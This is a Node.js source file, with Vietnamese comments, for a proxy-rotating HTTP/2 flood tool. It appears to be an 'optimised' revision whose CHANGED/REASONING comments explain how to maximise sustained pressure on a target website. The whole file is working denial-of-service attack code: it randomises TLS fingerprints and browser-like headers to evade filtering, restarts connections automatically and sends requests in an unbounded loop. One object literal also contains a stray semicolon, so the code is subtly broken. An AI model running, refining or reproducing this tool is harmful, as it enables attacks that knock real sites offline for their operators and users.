const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

// --- Bỏ qua các phần không thay đổi ---
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
    // console.warn(exception);
});

if (process.argv.length < 7) {
    console.log(`Usage: node script.js target time rate thread proxyfile`);
    process.exit();
}
const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean); // Lọc các dòng trống
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512',
    'hmac_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pkcs1_sha1', 'hmac_sha1'
];
const accept_header = [
    '*/*', 'image/*', 'image/webp,image/apng', 'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'application/json', 'application/xml', 'application/pdf', 'text/css', 'application/javascript'
];
const lang_header = [
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'en-ZA', 'fr-FR', 'ja-JP', 'ar-EG', 'de-DE', 'es-ES'
];
const encoding_header = [
    'gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch',
    'deflate', 'identity', 'compress', 'br'
];
const version = [
    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Mozilla Firefox";v="91", ";Not A Brand";v="99"',
    '"Safari";v="14.1.2", "Chrome";v="91.0.4472.164", "Safari";v="14.1.2"',
    '"Opera";v="79.0.4143.22", "Chrome";v="92.0.4515.115", "Opera";v="79.0.4143.22"',
    '"Microsoft Edge";v="92.0.902.62", "Chrome";v="92.0.4515.131", "Microsoft Edge";v="92.0.902.62"'
];
const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "proxy-client-ip": randstr(12) },
    { "via": randstr(12) },
    { "cluster-ip": randstr(12) },
    { "user-agent": randstr(12) },
];

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// --- LOGIC TỐI ƯU HÓA BẮT ĐẦU TỪ ĐÂY ---

if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    // GIẢI THÍCH LẠI Ý NGHĨA CỦA "RATE"
    console.log('\x1b[1m\x1b[31m' + 'Concurrent Connections / Thread: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
    console.log('--------------------------------------');

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    // CHANGED: Timer được quản lý bởi master process
    // REASONING: Đảm bảo cuộc tấn công kết thúc đúng giờ và tất cả các worker đều dừng lại.
    setTimeout(() => {
        console.log('\n\x1b[1m\x1b[31m' + 'Attack finished.' + '\x1b[0m');
        cluster.disconnect();
        process.exit(0);
    }, args.time * 1000);

} else {
    // CHANGED: Mỗi worker sẽ khởi tạo `args.Rate` luồng tấn công đồng thời.
    // REASONING: Tận dụng tối đa tài nguyên của worker bằng cách tạo nhiều kết nối song song.
    for (let i = 0; i < args.Rate; i++) {
        runFlooder();
    }
}

class NetSocket {
    constructor() { }
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });
        connection.setTimeout(options.timeout * 1000); // Đã giảm timeout để nhanh chóng thử lại proxy khác
        connection.setKeepAlive(true, 60000); // Keep alive
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error.message);
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10, // Giảm timeout để nhanh chóng chuyển proxy khi có sự cố
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            // CHANGED: Nếu kết nối proxy thất bại, thử lại ngay lập tức với proxy khác.
            // REASONING: Duy trì số lượng kết nối tấn công liên tục.
            runFlooder();
            return;
        }

        connection.setKeepAlive(true, 60000);

        // Randomize TLS options for each connection
        const siga = randomElement(sig);
        const tlsOptions = (Math.random() < 0.5) ?
        {
            secure: true, ALPNProtocols: ['h2'], sigals: siga,
            socket: connection, ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'P-256:P-384', host: parsedTarget.host, servername: parsedTarget.host, rejectUnauthorized: false,
        } :
        {
            secure: true, ALPNProtocols: ['h2'],
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'auto', rejectUnauthorized: false, servername: parsedTarget.host,
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_SINGLE_DH_USE |
                           crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_QUERY_MTU,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, { ...tlsOptions, socket: connection });
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536, maxConcurrentStreams: 20000,
                initialWindowSize: 6291456, maxHeaderListSize: 65536, enablePush: false
            },
            createConnection: () => tlsConn,
        });

        client.on("connect", () => {
            // CHANGED: Loại bỏ setInterval và thay bằng một vòng lặp liên tục.
            // REASONING: Gửi request nhanh nhất có thể, không bị giới hạn bởi timer.
            const attack = () => {
                if (client.destroyed) return;

                // Randomize headers for each request
                const ver = randomElement(version);
                const accept = randomElement(accept_header);
                const lang = randomElement(lang_header);
                const encoding = randomElement(encoding_header);

                const dynHeaders = {
                    ":method": "GET",
                    ":authority": parsedTarget.host,
                    ":path": parsedTarget.path + "?" + randstr(12) + "=" + randstr(6),
                    ":scheme": "https";
                    "sec-ch-ua": ver,
                    "sec-ch-ua-platform": "Windows",
                    "sec-ch-ua-mobile": "?0",
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "upgrade-insecure-requests": "1",
                    "accept": accept,
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-dest": "document",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "x-requested-with": "XMLHttpRequest",
                    ...randomElement(rateHeaders)
                };

                const request = client.request(dynHeaders);

                request.on("response", () => {
                    request.close(); // Đóng stream ngay khi có response để giải phóng tài nguyên
                });

                request.on("error", (err) => {
                    request.destroy();
                });
                
                request.end();
                
                // Gửi request tiếp theo ngay lập tức
                setImmediate(attack);
            };
            
            // Bắt đầu vòng lặp tấn công
            attack();
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            // CHANGED: Khi kết nối bị đóng, bắt đầu lại một luồng tấn công mới.
            // REASONING: Đảm bảo worker luôn hoạt động và duy trì áp lực lên mục tiêu.
            runFlooder();
        });

        client.on("error", (err) => {
            client.destroy();
            connection.destroy();
        });
    });
}
